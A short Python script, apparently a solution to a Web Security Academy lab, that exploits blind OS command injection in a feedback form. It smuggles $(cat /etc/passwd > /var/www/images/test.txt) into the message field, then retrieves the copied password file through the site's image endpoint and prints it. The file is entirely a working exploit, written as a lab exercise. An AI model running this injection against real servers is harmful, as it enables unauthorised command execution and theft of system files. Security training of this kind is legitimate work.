import requests

DOMAIN = "0abf009f04cf672d81555239002e0086.web-security-academy.net"

COOKIES = {
    "session": ""
}

def get_csrf_token():
    url = f"https://{DOMAIN}/feedback"
    response = requests.get(url)

    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]

    COOKIES["session"] = response.cookies["session"]
    return csrf_token

def submit_feedback(feedback):
    csrf_token = get_csrf_token()
    url = f"https://{DOMAIN}/feedback/submit"
    data = {
        "csrf": csrf_token,
        "name": "test",
        "email": "asd@asd",
        "subject": "asd",
        "message": feedback
    }

    response = requests.post(url, cookies=COOKIES, data=data)

def get_file_content():
    file_name = "test.txt"
    submit_feedback(f"$(cat /etc/passwd > /var/www/images/{file_name})")

    response = requests.get(f"https://{DOMAIN}/image?filename={file_name}")

    print(response.text)

get_file_content()